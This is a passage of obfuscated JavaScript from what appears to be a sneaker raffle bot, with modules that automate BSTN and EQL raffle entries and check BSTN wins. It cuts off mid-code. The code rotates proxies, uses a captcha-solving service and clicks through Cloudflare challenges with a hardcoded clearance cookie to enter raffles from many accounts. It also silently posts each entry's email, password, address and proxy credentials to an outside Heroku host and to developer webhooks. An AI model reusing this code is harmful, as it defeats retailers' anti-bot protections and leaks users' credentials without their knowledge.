                                    return console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x399027['name'] + ']\x20Task\x20' + (_0x38b15a + 0x1) + '\x20:\x20Retrying\x20(' + _0x4ecb05 + '\x20/\x205)')), _0x214876--, _0x4ecb05 = _0x4ecb05 + 0x1, _0x5f94de(_0x399027, _0x4c3e0b, _0x324a80, _0x38b15a, _0x4ecb05);
                                _0x2f1460 == 'yes' && _0x4ecb05 >= 0x5 && (_0x2f1460 = 'no', _0x4ecb05 = 0x0), _0x214876--, console['log'](_0x1211a5() + '\x20[' + _0x399027['name'] + ']\x20Waiting\x20for\x20' + _0x4562fb['delay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['delay']);
                            }
                        }
                        if (_0x3f808e == _0x5ae18e['length'] - 0x1) {
                            await _0x5f94de(_0xa94fef, _0x5ae18e, _0x186ef8, _0x3f808e, 0x0);
                            return;
                        }
                        _0x5f94de(_0xa94fef, _0x5ae18e, _0x186ef8, _0x3f808e, 0x0), await _0x4d97b0(0x12c);
                    }
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x304233, _0x4494bf, _0x13566a) {
                    var _0x407bf2 = 0x0, _0x4bbe1e = _0x4494bf;
                    for (var _0x121b3a = 0x0; _0x121b3a < _0x4494bf['length']; _0x121b3a++) {
                        maxTasks = Number(_0x4562fb['threads']);
                        while (_0x407bf2 >= maxTasks) {
                            await _0x4d97b0(_0x4562fb['delay']);
                        }
                        let _0x2dd27c = ![];
                        async function _0x3a748c(_0x11622d, _0x6f9388, _0x234363, _0x255293, _0x522c51) {
                            _0x407bf2++, _0x3621d0['use'](_0x509c12()), _0x3621d0['use'](_0x14703b({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x4562fb['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x13902a, _0x4c2a55 = _0x6f9388[_0x255293];
                            try {
                                await _0x43eceb(_0x6f9388, _0x255293);
                            } catch {
                                _0x35d5dd = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            async function _0x2d75b9(_0x3fc4db) {
                                const _0x2fd03a = _0x4a3989['readFileSync']('../successful-tasks.csv', 'utf8'), _0x107e8d = _0x4dbee3['parse'](_0x2fd03a, { 'header': !![] })['data'];
                                let _0x5b0392 = ![];
                                for (var _0xe6f6a3 of _0x107e8d) {
                                    if (_0xe6f6a3['Url'] == _0x3fc4db['Url'] && _0xe6f6a3['Email'] == _0x3fc4db['Email']) {
                                        _0x5b0392 = !![];
                                        break;
                                    }
                                }
                                return _0x5b0392;
                            }
                            _0x81eb1(_0x11622d['name'] + '\x20Task\x20' + (_0x255293 + 0x1) + '\x20/\x20' + _0x6f9388['length'] + '\x20||\x20File:\x20' + _0x367847 + '\x20Proxies:\x20' + _0x259b4b);
                            var _0x3e2d5f = Math['round'](Math['random']() * (_0x234363['length'] - 0x1)), _0x5dddeb = _0x234363[_0x3e2d5f]['split'](':'), _0x5efb1d;
                            let _0x1dcb1c = ![], _0x35d5dd = 'no';
                            try {
                                if (await _0x2d75b9(_0x6f9388[_0x255293]) == !![]) {
                                    console['log'](_0x1211a5() + '\x20[' + _0x11622d['name'] + ']\x20Task\x20' + (_0x255293 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x1dcb1c = !![], _0x2dd27c = !![];
                                    return;
                                }
                                try {
                                    _0x5efb1d = await _0x3621d0['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x5dddeb[0x0] + ':' + _0x5dddeb[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x5efb1d = await _0x3621d0['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x5dddeb[0x0] + ':' + _0x5dddeb[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x29f44e = await _0x5efb1d['newPage'](), _0x29fac4 = await _0x29f44e['target']()['createCDPSession'](), { windowId: _0x51fc2c } = await _0x29fac4['send']('Browser.getWindowForTarget');
                                await _0x29f44e['setViewport']({
                                    'width': 0x501,
                                    'height': 0x2d0
                                });
                                var _0x2ccf0b = [{
                                    'name': 'cf_clearance',
                                    'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                    'domain': '.bstn.com',
                                    'path': '/',
                                    'expires': 1707818183.331533,
                                    'httpOnly': !![],
                                    'secure': !![]
                                }];
                                await _0x29f44e['authenticate']({
                                    'username': '' + _0x5dddeb[0x2],
                                    'password': '' + _0x5dddeb[0x3]
                                }), console['log'](_0x1211a5() + '\x20[' + _0x11622d['name'] + ']\x20Task\x20' + (_0x255293 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x29f44e['goto']('' + _0x6f9388[_0x255293]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x1211a5() + '\x20[' + _0x11622d['name'] + ']\x20Task\x20' + (_0x255293 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x4d97b0(0x1388);
                                var _0x5cdc9c = await _0x29f44e['$']('#turnstile-wrapper');
                                if (_0x5cdc9c) {
                                    console['log'](_0x1211a5() + '\x20[' + _0x11622d['name'] + ']\x20Task\x20' + (_0x255293 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x4d97b0(0x2710);
                                    const _0x5dd54b = await _0x29f44e['$']('#turnstile-wrapper');
                                    if (_0x5dd54b)
                                        try {
                                            await _0x5dd54b['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x29f44e['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x375159 = await _0x29f44e['$']('#turnstile-wrapper');
                                        if (_0x375159)
                                            try {
                                                await _0x375159['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x29f44e['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                                } catch {
                                    throw new Error('Blocked\x20by\x20Cloudflare');
                                }
                                await _0x29fac4['send']('Browser.setWindowBounds', {
                                    'windowId': _0x51fc2c,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x4d97b0(0x1388), await _0x29f44e['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x29f44e['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4d97b0(0x1f4), console['log'](_0x1211a5() + '\x20[' + _0x11622d['name'] + ']\x20Task\x20' + (_0x255293 + 0x1) + '\x20:\x20Logging\x20in'), await _0x29f44e['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x59c397 => _0x59c397['click']()), await _0x29f44e['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x29f44e['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4d97b0(0x7d0), await _0x29f44e['waitForSelector']('#email-login'), await _0x29f44e['type']('#email-login', '' + _0x6f9388[_0x255293]['Email']['toLowerCase'](), { 'delay': 0xe6 }), await _0x4d97b0(0xdac), await _0x29f44e['waitForSelector']('#password'), await _0x29f44e['type']('#password', '' + _0x6f9388[_0x255293]['Password'], { 'delay': 0xe6 }), await _0x4d97b0(0x157c);
                                try {
                                    await _0x29f44e['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x29dac8 => _0x29dac8['click']());
                                } catch {
                                }
                                try {
                                    await _0x29f44e['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                                } catch (_0x555d30) {
                                }
                                await _0x4d97b0(0x3e8);
                                const _0x4da33a = await _0x29f44e['$']('.enteredDraw_container__2KmQ_');
                                if (_0x4da33a) {
                                    console['log']('Duplicate\x20entry,\x20skipping');
                                    return;
                                }
                                console['log'](_0x1211a5() + '\x20[' + _0x11622d['name'] + ']\x20Task\x20' + (_0x255293 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x6f9388[_0x255293]['Size']);
                                try {
                                    if (_0x6f9388[_0x255293]['Size'] != 'RANDOM') {
                                        var _0x3c3192 = _0x6f9388[_0x255293]['Size']['replace']('.', ',');
                                        const _0x34f747 = await _0x29f44e['$x']('//div[contains(text(),\x20\x27' + _0x3c3192 + '\x27)]');
                                        await _0x34f747[0x0]['click']();
                                    } else {
                                        const _0x471142 = await _0x29f44e['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x1e02c9 = Math['round'](Math['random']() * (_0x471142['length'] - 0x1));
                                        await _0x471142[_0x1e02c9]['click']();
                                    }
                                } catch (_0x3f2e87) {
                                    throw new Error('Softblocked,\x20Rotating\x20proxy');
                                }
                                await _0x4d97b0(0x1f4);
                                const _0x102252 = await _0x29f44e['$']('.addressList_addressItem__LE2PB');
                                if (_0x102252 && _0x6f9388[_0x255293]['Mode'] != 'NEW') {
                                } else
                                    console['log'](_0x1211a5() + '\x20[' + _0x11622d['name'] + ']\x20Task\x20' + (_0x255293 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x29f44e['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x4d97b0(0x5dc), await _0x29f44e['waitForSelector']('#firstname'), await _0x29f44e['type']('#firstname', '' + _0x6f9388[_0x255293]['FirstName']), await _0x4d97b0(0x1f4), await _0x29f44e['waitForSelector']('#firstname'), await _0x29f44e['type']('#lastname', '' + _0x6f9388[_0x255293]['LastName']), await _0x4d97b0(0x1f4), await _0x29f44e['waitForSelector']('#firstname'), await _0x29f44e['type']('#street', '' + _0x6f9388[_0x255293]['Address1']), await _0x4d97b0(0x1f4), await _0x29f44e['waitForSelector']('#firstname'), await _0x29f44e['type']('#houseNumber', _0x6f9388[_0x255293]['HouseNumber'] + '\x20' + _0x6f9388[_0x255293]['Address2']), await _0x4d97b0(0x1f4), await _0x29f44e['waitForSelector']('#firstname'), await _0x29f44e['select']('#country_code', '' + _0x6f9388[_0x255293]['Country']), await _0x4d97b0(0x1f4), await _0x29f44e['type']('#postcode', '' + _0x6f9388[_0x255293]['Zip']), await _0x4d97b0(0x1f4), await _0x29f44e['type']('#city', '' + _0x6f9388[_0x255293]['City']), await _0x4d97b0(0x1f4), await _0x29f44e['type']('#telephone', '' + _0x6f9388[_0x255293]['Phone']), await _0x4d97b0(0x1f4), await _0x29f44e['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                                await _0x4d97b0(0x9c4);
                                try {
                                    await _0x29f44e['type']('#instagram_name', '' + _0x6f9388[_0x255293]['Follower']), await _0x29f44e['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x1211a5() + '\x20[' + _0x11622d['name'] + ']\x20Task\x20' + (_0x255293 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x4d97b0(0x5dc);
                                try {
                                    await _0x29f44e['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x4d97b0(0x5dc), await _0x29f44e['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x4f9734 => _0x4f9734['click']()), await _0x4d97b0(0x1388);
                                try {
                                    await _0x29f44e['waitForSelector']('.success_msg__2HjJY');
                                } catch {
                                    await _0x29f44e['reload']({ 'waitUntil': 'networkidle2' });
                                    if (_0x6f9388[_0x255293]['Size'] != 'RANDOM') {
                                        var _0x3c3192 = _0x6f9388[_0x255293]['Size']['replace']('.', ',');
                                        const _0x4bb723 = await _0x29f44e['$x']('//div[contains(text(),\x20' + _0x3c3192 + ')]');
                                        await _0x4bb723[0x0]['click']();
                                    } else {
                                        const _0x88b2d2 = await _0x29f44e['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x1e02c9 = Math['round'](Math['random']() * (_0x88b2d2['length'] - 0x1));
                                        await _0x88b2d2[_0x1e02c9]['click']();
                                    }
                                    await _0x4d97b0(0x5dc);
                                    try {
                                        await _0x29f44e['hover']('#instagram_name'), await _0x29f44e['type']('#instagram_name', '' + _0x6f9388[_0x255293]['Follower']), await _0x29f44e['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                    } catch {
                                    }
                                    console['log'](_0x1211a5() + '\x20[' + _0x11622d['name'] + ']\x20Task\x20' + (_0x255293 + 0x1) + '\x20:\x20Retrying\x20(' + _0x522c51 + '\x20/\x205)');
                                    try {
                                        await _0x29f44e['hover']('.checkBox_boxHolder__wLGVe'), await _0x4d97b0(0x5dc), await _0x29f44e['click']('.checkBox_boxHolder__wLGVe');
                                    } catch {
                                    }
                                    await _0x4d97b0(0x157c), await _0x29f44e['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x17fdfc => _0x17fdfc['click']()), await _0x4d97b0(0x1388), await _0x29f44e['waitForSelector']('.success_msg__2HjJY');
                                }
                                _0x35d5dd = 'no', _0x3b7ca0(_0x6f9388[_0x255293], _0x11622d);
                                try {
                                    prxdata = {
                                        'username': _0x1d8120['replace']('#', ''),
                                        'entrydata': JSON['stringify'](_0x50a0f2),
                                        'proxy': '' + _0x234363[_0x255293]
                                    };
                                    var _0x1237f5 = JSON['stringify'](prxdata);
                                    let _0x38dfb5 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x4012a9['post']('https://jraffles.herokuapp.com/success', _0x1237f5, _0x38dfb5);
                                } catch (_0x54bc13) {
                                }
                                console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0x11622d['name'] + ']\x20Task\x20' + (_0x255293 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x515267 = await _0x4ef820(_0x6f9388[_0x255293], _0x11622d, 'dev', ![]), _0x12c2e9 = await _0x4ef820(_0x6f9388[_0x255293], _0x11622d, 'pub', ![]);
                                const _0x92d5ae = {
                                    'succesDEVMSG': { 'embeds': [_0x515267] },
                                    'succesPUBMSG': { 'embeds': [_0x12c2e9] }
                                };
                                let _0x50a0f2 = _0x6f9388[_0x255293];
                                try {
                                    prxdata = {
                                        'username': _0x1d8120['replace']('#', ''),
                                        'module': _0x11622d['name'],
                                        'entrydata': JSON['stringify'](_0x50a0f2),
                                        'proxy': '' + _0x234363[_0x255293]
                                    };
                                    var _0x1237f5 = JSON['stringify'](prxdata);
                                    let _0x3ec956 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x4012a9['post']('https://jraffles.herokuapp.com/success', _0x1237f5, _0x3ec956);
                                } catch (_0x2cfc0e) {
                                }
                                try {
                                    _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x92d5ae['succesDEVMSG']), await _0x4d97b0(0xc8), await _0xa7b872(_0x27bacd, _0x92d5ae['succesDEVMSG']), await _0x4d97b0(0xc8), await _0xa7b872(_0x3f583b, _0x92d5ae['succesPUBMSG']);
                                } catch (_0x319f28) {
                                    console['log'](_0x1de0e8['yellow'](_0x1211a5() + '\x20[' + _0x11622d['name'] + ']\x20Task\x20' + (_0x255293 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x319f28));
                                }
                            } catch (_0x29fcef) {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x11622d['name'] + ']\x20Task\x20' + (_0x255293 + 0x1) + '\x20:\x20' + _0x29fcef)), _0x35d5dd = 'yes', _0x13902a = '' + _0x29fcef;
                                var _0x348625 = await _0x4ef820(_0x6f9388[_0x255293], _0x11622d, 'dev', !![], _0x13902a), _0x515267 = await _0x4ef820(_0x6f9388[_0x255293], _0x11622d, 'dev', ![]), _0x12c2e9 = await _0x4ef820(_0x6f9388[_0x255293], _0x11622d, 'pub', ![]);
                                const _0x1d0db0 = {
                                    'succesDEVMSG': { 'embeds': [_0x515267] },
                                    'succesPUBMSG': { 'embeds': [_0x12c2e9] }
                                };
                                _0x1d0db0['errorDEV'] = { 'embeds': [_0x348625] }, _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x1d0db0['errorDEV']), await _0xa7b872(_0x5f83c7, _0x1d0db0['errorDEV']);
                            } finally {
                                _0x5efb1d && _0x5efb1d['close']();
                                if (_0x35d5dd == 'yes' && _0x522c51 != 0x5)
                                    return console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x11622d['name'] + ']\x20Task\x20' + (_0x255293 + 0x1) + '\x20:\x20Retrying\x20(' + _0x522c51 + '\x20/\x205)')), _0x522c51 = _0x522c51 + 0x1, _0x407bf2--, _0x3a748c(_0x11622d, _0x6f9388, _0x234363, _0x255293, _0x522c51);
                                _0x35d5dd == 'yes' && _0x522c51 >= 0x5 && _0x320814(_0x6f9388[_0x255293], _0x11622d), !_0x1dcb1c && (console['log'](_0x1211a5() + '\x20[' + _0x11622d['name'] + ']\x20Waiting\x20for\x20' + _0x4562fb['delay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['delay'])), _0x407bf2--;
                            }
                        }
                        _0x3a748c(_0x304233, _0x4bbe1e, _0x13566a, _0x121b3a, 0x0), await _0x4d97b0(0x7d0);
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x271375, _0x293d0f) {
                    var _0x544f00 = 0x0, _0x32ea53;
                    try {
                        const _0x57e36f = _0x4a3989['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x32ea53 = _0x4dbee3['parse'](_0x57e36f, { 'header': !![] })['data'];
                    } catch (_0xcf4ced) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x20efae = 0x0; _0x20efae < _0x32ea53['length']; _0x20efae++) {
                        maxTasks = Number(_0x4562fb['threads']);
                        while (_0x544f00 >= maxTasks) {
                            await _0x4d97b0(_0x4562fb['delay']);
                        }
                        async function _0x4d44df(_0x7973ca, _0x5b2b2a, _0x46c4a4, _0x566666, _0x30eef4) {
                            _0x544f00++, _0x3621d0['use'](_0x509c12()), _0x3621d0['use'](_0x14703b({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x4562fb['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x51d78c != 'yes')
                                var _0x51d78c = '', _0x30eef4 = 0x0;
                            var _0xa1b14;
                            _0x81eb1(_0x7973ca['name'] + '\x20Task\x20' + (_0x566666 + 0x1) + '\x20/\x20' + _0x46c4a4['length'] + '\x20||\x20File:\x20' + _0x367847 + '\x20Proxies:\x20' + _0x259b4b);
                            var _0x26bb59 = await _0x4ef820(_0x46c4a4[_0x566666], _0x7973ca, 'acc', ![]);
                            const _0x11c140 = { 'succesDEVMSG': { 'embeds': [_0x26bb59] } }, _0x502248 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x3b0603 = Math['round'](Math['random']() * (_0x5b2b2a['length'] - 0x1)), _0x4018a9 = _0x5b2b2a[_0x3b0603]['split'](':'), _0x2b9f50;
                            try {
                                _0x2b9f50 = await _0x3621d0['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x4018a9[0x0] + ':' + _0x4018a9[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x2b9f50 = await _0x3621d0['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x4018a9[0x0] + ':' + _0x4018a9[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                console['log'](_0x1211a5() + '\x20[' + _0x7973ca['name'] + ']\x20Task\x20' + (_0x566666 + 0x1) + '\x20:\x20Checking\x20' + _0x46c4a4[_0x566666]['Email']);
                                const _0x130fb2 = await _0x2b9f50['newPage']();
                                await _0x130fb2['authenticate']({
                                    'username': '' + _0x4018a9[0x2],
                                    'password': '' + _0x4018a9[0x3]
                                }), console['log'](_0x1211a5() + '\x20[' + _0x7973ca['name'] + ']\x20Task\x20' + (_0x566666 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x130fb2['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x130fb2['setRequestInterception'](!![]), _0x130fb2['on']('request', _0x258b9b => {
                                    _0x258b9b['resourceType']() === 'image' ? _0x258b9b['abort']() : _0x258b9b['continue']();
                                });
                                try {
                                    await _0x130fb2['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x130fb2['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0x51d78c = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                await _0x130fb2['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x1211a5() + '\x20[' + _0x7973ca['name'] + ']\x20Task\x20' + (_0x566666 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x4d97b0(0x3e8), await _0x130fb2['type']('#email', _0x46c4a4[_0x566666]['Email']), await _0x4d97b0(0x1f4), await _0x130fb2['type']('#pass', _0x46c4a4[_0x566666]['Password']), await _0x4d97b0(0x1f4), await _0x130fb2['$eval']('#login-form', _0x1359d5 => _0x1359d5['submit']());
                                try {
                                    await _0x130fb2['waitForSelector']('.product-items');
                                } catch {
                                    console['log'](_0x1211a5() + '\x20[' + _0x7973ca['name'] + ']\x20Task\x20' + (_0x566666 + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                    return;
                                }
                                await _0x4d97b0(0x190);
                                const _0x156ba3 = await _0x130fb2['evaluate'](() => {
                                    const _0x34032b = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                    return _0x34032b['map'](_0x511fcd => _0x511fcd['alt']);
                                }), _0x14d94f = await _0x130fb2['evaluate'](() => {
                                    const _0x3039c4 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                    return _0x3039c4['map'](_0x487503 => _0x487503['innerHTML']);
                                }), _0x3c8c59 = await _0x130fb2['$$']('.raffle-winner');
                                if (_0x3c8c59['length'] < 0x1) {
                                    console['log'](_0x1211a5() + '\x20[' + _0x7973ca['name'] + ']\x20Task\x20' + (_0x566666 + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x51d78c = 'no';
                                    return;
                                }
                                console['log'](_0x1211a5() + '\x20[' + _0x7973ca['name'] + ']\x20Task\x20' + (_0x566666 + 0x1) + '\x20:\x20' + _0x3c8c59['length'] + '\x20Wins\x20Found!');
                                for (var _0x12d909 = 0x0; _0x12d909 < _0x3c8c59['length']; _0x12d909++) {
                                    console['log'](_0x1de0e8['green'](_0x156ba3[_0x12d909] + _0x14d94f[_0x12d909]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                                }
                            } catch (_0x5a2e04) {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x7973ca['name'] + ']\x20Task\x20' + (_0x566666 + 0x1) + '\x20:\x20' + _0x5a2e04)), _0xa1b14 = '' + _0x5a2e04;
                                var _0x3f583f = await _0x4ef820(_0x46c4a4[_0x566666], _0x7973ca, 'acc', !![], _0xa1b14);
                                _0x11c140['errorDEV'] = { 'embeds': [_0x3f583f] }, _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x11c140['errorDEV']), await _0xa7b872(_0x5f83c7, _0x11c140['errorDEV']), _0x51d78c = 'yes';
                            } finally {
                                if (_0x2b9f50)
                                    _0x2b9f50['close']();
                                if (_0x51d78c == 'yes' && _0x30eef4 != 0x5)
                                    return console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x7973ca['name'] + ']\x20Task\x20' + (_0x566666 + 0x1) + '\x20:\x20Retrying\x20(' + _0x30eef4 + '\x20/\x205)')), _0x544f00--, _0x30eef4 = _0x30eef4 + 0x1, _0x4d44df(_0x7973ca, _0x5b2b2a, _0x46c4a4, _0x566666, _0x30eef4);
                                _0x51d78c == 'yes' && _0x30eef4 >= 0x5 && (_0x320814(_0x46c4a4[_0x566666], _0x7973ca), _0x51d78c = 'no', _0x30eef4 = 0x0), console['log'](_0x1211a5() + '\x20[' + _0x7973ca['name'] + ']\x20Waiting\x20for\x20' + _0x4562fb['delay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['delay']), _0x544f00--;
                            }
                        }
                        _0x4d44df(_0x271375, _0x293d0f, _0x32ea53, _0x20efae, 0x0), await _0x4d97b0(0x15e);
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0xacb416, _0x1d2d26, _0x3d8208) {
                _0x3621d0['use'](_0x509c12()), _0x3621d0['use'](_0x14703b({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4562fb['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x29f52e = 0x0; _0x29f52e < _0x1d2d26['length']; _0x29f52e++) {
                    var _0x271159;
                    _0x81eb1(_0xacb416['name'] + '\x20Task\x20' + (_0x29f52e + 0x1) + '\x20/\x20' + _0x1d2d26['length'] + '\x20||\x20File:\x20' + _0x367847 + '\x20Proxies:\x20' + _0x259b4b);
                    try {
                        await _0x43eceb(_0x1d2d26, _0x29f52e);
                    } catch {
                        _0x436126 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x180f72(_0x2d1789) {
                        const _0x13e836 = _0x4a3989['readFileSync']('../successful-tasks.csv', 'utf8'), _0x4b910a = _0x4dbee3['parse'](_0x13e836, { 'header': !![] })['data'];
                        let _0x120263 = ![];
                        for (var _0x2d6898 of _0x4b910a) {
                            if (_0x2d6898['Url'] == _0x2d1789['Url'] && _0x2d6898['Email'] == _0x2d1789['Email']) {
                                _0x120263 = !![];
                                break;
                            }
                        }
                        return _0x120263;
                    }
                    if (await _0x180f72(_0x1d2d26[_0x29f52e]) == !![]) {
                        console['log'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x44e790 = ![];
                    const _0x43e5f4 = _0x4a3989['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x2324dc = _0x4dbee3['parse'](_0x43e5f4, { 'header': !![] })['data'];
                    for (var _0x3218fb of _0x2324dc) {
                        _0x3218fb['Email'] == _0x1d2d26[_0x29f52e]['Email'] && (_0x44e790 = !![]);
                    }
                    if (_0x44e790 == ![]) {
                        var _0x5e91d5;
                        if (_0x1d2d26[_0x29f52e]['Url']['endsWith']('/')) {
                            _0x5e91d5 = _0x1d2d26[_0x29f52e]['Url'] + 'register';
                            if (_0x436126 != 'yes')
                                var _0x436126 = '', _0x243234 = 0x0;
                        } else {
                            _0x5e91d5 = _0x1d2d26[_0x29f52e]['Url'] + '/register';
                            if (_0x436126 != 'yes')
                                var _0x436126 = '', _0x243234 = 0x0;
                        }
                        if (_0x1d2d26[_0x29f52e]['Email'] == '' || _0x1d2d26[_0x29f52e]['FirstName'] == '' || _0x1d2d26[_0x29f52e]['LastName'] == '') {
                            console['log'](_0x1211a5() + '\x20[' + _0xacb416['name'] + ']\x20Task\x20' + (_0x29f52e + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x1d2d26[_0x29f52e]['Password'] == '' && (_0x1d2d26[_0x29f52e]['Password'] = 'JRaffles23!');
                        if (_0x4562fb['useRandomProxy'] = ![])
                            var _0x1f93a8 = _0x3d8208[_0x29f52e]['split'](':');
                        else
                            var _0x45c6f5 = Math['round'](Math['random']() * (_0x3d8208['length'] - 0x1)), _0x1f93a8 = _0x3d8208[_0x45c6f5]['split'](':');
                        var _0x1180dc;
                        try {
                            _0x1180dc = await _0x3621d0['launch']({
